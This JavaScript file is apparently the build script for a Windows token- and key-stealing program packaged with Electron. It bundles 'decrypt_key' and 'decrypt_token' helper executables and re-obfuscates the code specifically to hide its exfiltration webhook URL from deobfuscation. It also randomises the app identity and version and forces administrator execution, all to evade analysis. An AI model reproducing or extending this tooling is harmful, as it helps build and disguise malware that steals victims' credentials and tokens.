const builder = require('electron-builder');
const { copyFileSync, readFileSync } = require('fs');
const { join } = require('path');
const { obfuscate } = require('js-confuser');

// Copy decryptors to the "dist" folder
copyFileSync(join(__dirname, 'util', 'decrypt-key', 'decrypt_key.exe'), join(__dirname, 'dist', 'decrypt_key.exe'));
copyFileSync(join(__dirname, 'util', 'decrypt-token', 'decrypt_token.exe'), join(__dirname, 'dist', 'decrypt_token.exe'));

function randomString(length) {
  let result = '';
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

// Parts of the code, like the webhook URL, can be get using websites deobfuscating the code
// Like this website: https://deobfuscate.relative.im/
// So we obfuscate the code once again (Webpack makes the first obfuscation)
obfuscate(readFileSync(join('dist', 'index.bundle.js')).toString(), {
  target: 'node',
  renameVariables: true,
  identifierGenerator: 'mangled',
  minify: true,
  compact: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: true,
  deadCode: true,
  calculator: true,
}).then(() => {
  console.log('Finished reobfuscating the code');
  // Build the executable
  builder.build({
    targets: builder.Platform.WINDOWS.createTarget(),
    config: {
      appId: 'com.' + randomString(16),
      productName: require('./config').name,
      executableName: require('./config').filename,
      icon: './icon.ico',
      compression: 'maximum',
      buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
      artifactName: require('./config').filename + '.exe',
      win: {
        requestedExecutionLevel: 'requireAdministrator', // Force launch as administrator
      },
      files: [
        'dist/*.bundle.js',
        'dist/*.exe'
      ],
    }
  });
});
